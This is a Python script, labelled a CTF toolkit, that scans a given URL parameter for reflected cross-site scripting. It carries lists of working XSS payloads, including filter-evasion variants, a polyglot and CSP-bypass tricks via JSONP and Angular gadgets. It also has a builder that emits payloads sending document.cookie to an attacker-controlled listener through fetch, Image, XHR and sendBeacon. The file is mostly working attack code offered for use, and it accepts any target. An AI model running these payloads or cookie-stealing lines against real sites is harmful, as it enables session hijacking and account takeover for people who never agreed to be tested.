#!/usr/bin/env python3
"""
XSS Scanner & Payload Generator — CTF Toolkit
Covers: reflected, stored-probe, DOM hints, CSP bypass, filter evasion
Usage: python3 xss_scanner.py --url https://target.com --param q
"""
import requests, argparse, re, html, urllib.parse, sys
from itertools import product

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

CANARY = "xss_canary_7331"

# ─── PAYLOAD SETS ─────────────────────────────────────────────────────────────

BASIC = [
    f'<script>alert("{CANARY}")</script>',
    f'<img src=x onerror=alert("{CANARY}")>',
    f'<svg onload=alert("{CANARY}")>',
    f'<body onload=alert("{CANARY}")>',
    f'"autofocus onfocus=alert("{CANARY}")>',
    f"javascript:alert('{CANARY}')",
]

FILTER_BYPASS = [
    # Case variation
    f'<ScRiPt>alert("{CANARY}")</sCrIpT>',
    # Null byte / tab in tag
    f'<img/src=x onerror=alert("{CANARY}")>',
    f'<img\tsrc=x onerror=alert("{CANARY}")>',
    # Double encode
    f'%3Cscript%3Ealert%28%22{CANARY}%22%29%3C%2Fscript%3E',
    f'&lt;script&gt;alert("{CANARY}")&lt;/script&gt;',
    # HTML entity in attribute
    f'<img src=x onerror="&#97;lert(&#39;{CANARY}&#39;)">',
    # Unicode
    f'\u003cscript\u003ealert("{CANARY}")\u003c/script\u003e',
    # Backtick (IE old)
    f'<img src=`x` onerror=alert("{CANARY}")>',
    # Nested tag break
    f'<<script>alert("{CANARY}");//<</script>',
    # Template literals
    f'<svg><script>alert`{CANARY}`</script></svg>',
    # Polyglot
    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{CANARY}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{CANARY}')//\\x3e",
]

CSP_BYPASS = [
    # JSONP endpoints (fill in actual endpoint)
    '<script src="//accounts.google.com/o/oauth2/revoke?callback=alert"></script>',
    # Script gadget (Angular)
    '<div ng-app ng-csp><div ng-click=$event.view.alert("xss")>click</div></div>',
    # Redirect via meta
    f'<meta http-equiv="refresh" content="0;url=javascript:alert(\'{CANARY}\')">',
    # data: URI
    '<object data="data:text/html,<script>alert(1)</script>">',
    # Iframe srcdoc
    '<iframe srcdoc="<script>alert(1)</script>">',
    # style+expression (old IE)
    '<style>body{background:url("javascript:alert(1)")}</style>',
    # nonce guess (only works if predictable nonce)
    '<script nonce="REPLACE_WITH_NONCE">alert(1)</script>',
]

DOM_SINKS = [
    "document.write", "innerHTML", "outerHTML", "document.domain",
    "eval(", "setTimeout(", "setInterval(", "location.href",
    "location.hash", "document.cookie", "window.location",
    "postMessage", "localStorage", "sessionStorage",
]

# ─── SCANNER ──────────────────────────────────────────────────────────────────

def check_reflected(url: str, param: str, payload: str) -> bool:
    try:
        r = session.get(url, params={param: payload}, timeout=10)
        return CANARY in r.text
    except Exception:
        return False


def check_html_context(url: str, param: str) -> str:
    """Identify where input lands in the HTML."""
    probe = f"PROBE_{CANARY}_PROBE"
    try:
        r = session.get(url, params={param: probe}, timeout=10)
        body = r.text
        idx = body.find(probe)
        if idx == -1:
            return "not_reflected"
        before = body[max(0, idx-100):idx]
        if "<script" in before.lower():
            return "script_context"
        if re.search(r'value\s*=\s*["\']?$', before):
            return "attribute_value"
        if re.search(r'on\w+\s*=\s*["\']?$', before):
            return "event_handler"
        return "html_context"
    except Exception:
        return "error"


def scan_dom(url: str) -> list:
    """Look for DOM sinks in page source."""
    found = []
    try:
        r = session.get(url, timeout=10)
        for sink in DOM_SINKS:
            if sink in r.text:
                found.append(sink)
    except Exception:
        pass
    return found


def scan(url: str, param: str, verbose: bool = False) -> None:
    print(f"[*] Target: {url}?{param}=")
    ctx = check_html_context(url, param)
    print(f"[*] Input context: {ctx}")

    dom_sinks = scan_dom(url)
    if dom_sinks:
        print(f"[*] DOM sinks found in source: {', '.join(dom_sinks)}")

    # Check CSP header
    try:
        r = session.get(url, timeout=10)
        csp = r.headers.get("Content-Security-Policy", "")
        if csp:
            print(f"[*] CSP: {csp}")
        else:
            print("[*] No CSP header — basic payloads should work")
    except Exception:
        pass

    all_payloads = BASIC + FILTER_BYPASS + CSP_BYPASS
    hits = []
    for p in all_payloads:
        if check_reflected(url, param, p):
            print(f"[+] HIT: {p[:80]}")
            hits.append(p)
        elif verbose:
            print(f"[-] miss: {p[:60]}")

    if not hits:
        print("[-] No reflected XSS found with standard payloads")
        print("[*] Try manual DOM analysis or POST-based injection")
    else:
        print(f"\n[+] {len(hits)} payloads reflected. First working:")
        print(f"    {hits[0]}")


# ─── XSS EXFIL PAYLOAD BUILDER ────────────────────────────────────────────────

def build_exfil_payload(exfil_url: str, target: str = "document.cookie") -> list:
    """Build payloads to exfiltrate target to exfil_url."""
    return [
        f'<img src=x onerror="fetch(\'{exfil_url}?\'+btoa({target}))">',
        f'<script>new Image().src="{exfil_url}?c="+encodeURIComponent({target})</script>',
        f'<svg onload="var x=new XMLHttpRequest;x.open(\'GET\',\'{exfil_url}?\'+{target});x.send()">',
        f"<script>document.location='{exfil_url}?x='+encodeURIComponent({target})</script>",
        f'<img src=x onerror="navigator.sendBeacon(\'{exfil_url}\',{target})">',
    ]


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CTF XSS Scanner")
    parser.add_argument("--url",   required=True)
    parser.add_argument("--param", required=True)
    parser.add_argument("--mode",  choices=["scan","exfil","payloads"], default="scan")
    parser.add_argument("--exfil", default="https://your-listener.com", help="Exfil server URL")
    parser.add_argument("--target", default="document.cookie", help="JS expression to exfiltrate")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    if args.mode == "scan":
        scan(args.url, args.param, args.verbose)
    elif args.mode == "exfil":
        for p in build_exfil_payload(args.exfil, args.target):
            print(p)
    elif args.mode == "payloads":
        print("[*] Basic:")
        for p in BASIC: print(f"  {p}")
        print("\n[*] Filter Bypass:")
        for p in FILTER_BYPASS: print(f"  {p}")
        print("\n[*] CSP Bypass:")
        for p in CSP_BYPASS: print(f"  {p}")


if __name__ == "__main__":
    main()
